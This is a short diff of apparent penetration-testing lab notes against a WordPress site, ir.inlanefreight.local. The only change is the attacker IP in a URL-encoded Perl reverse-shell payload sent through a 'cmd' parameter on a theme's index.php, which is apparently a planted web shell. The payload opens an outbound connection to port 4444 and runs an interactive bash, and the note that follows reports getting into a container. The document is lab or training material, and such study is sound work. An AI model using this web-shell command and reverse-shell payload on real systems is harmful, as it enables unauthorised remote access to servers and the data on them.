@@ -13,6 +13,6 @@ http://ir.inlanefreight.local/wp-content/themes/twentytwentytwo/index.php?cmd=pw
 ```
 - After that command to get reverse shell should be 10.10.15.188:4444
 ```
-/wp-content/themes/twentytwentytwo/index.php?cmd=perl+-e+'use+Socket%3b$i%3d"10.10.15.157"%3b$p%3d4444%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("bash+-i")%3b}%3b'
+/wp-content/themes/twentytwentytwo/index.php?cmd=perl+-e+'use+Socket%3b$i%3d"10.10.14.196"%3b$p%3d4444%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("bash+-i")%3b}%3b'
 ```
 - woala, I am in container!!!
